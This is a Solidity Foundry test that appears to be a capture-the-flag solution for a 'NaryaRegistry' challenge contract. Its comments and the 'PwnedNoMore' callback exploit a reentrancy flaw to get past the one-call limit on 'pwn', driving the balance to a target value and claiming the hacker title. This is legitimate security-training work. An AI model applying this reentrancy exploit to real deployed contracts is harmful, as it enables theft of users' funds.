// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {NaryaRegistry} from "../src/NaryaRegistry.sol";

// In this task, we need to attain the title of NaryaHacker, which we can achieve in the `identifyNaryaHacker` function, in case if our balance equals 0xDA0.

// 1. First, we need to `register` to obtain the initial balance.
// 2. Although the `pwn` function has a restriction on being called only once, we can bypass it using reentrancy. This means during the callback:
//    ```
//    (bool result, ) = sender.call(abi.encodeWithSignature("PwnedNoMore(uint256)", _amount));
//    ```
//    Since the balance changes after the call, we need to manage it ourselves and perform reentrancy until our balance becomes 0xDA0.

contract NaryaRegistryTest is Test {
    uint256 private constant TARGET_BALANCE = 0xDA0;

    NaryaRegistry private registry;
    uint256 private totalBalance;

    function setUp() external {
        registry = new NaryaRegistry();
        registry.register();
    }

    function test_hackNaryaRegistry() external {
        totalBalance = registry.balanceOf(address(this));

        PwnedNoMore(0);
        registry.identifyNaryaHacker();

        assertTrue(registry.isNaryaHacker(address(this)));
    }

    function PwnedNoMore(uint256 val) public {
        uint256 tBalance = totalBalance - val;

        if (tBalance != TARGET_BALANCE) {
            uint256 r1 = registry.records1(address(this));
            uint256 r2 = registry.records2(address(this));
            registry.pwn(r1 + r2);
        }
    }
}
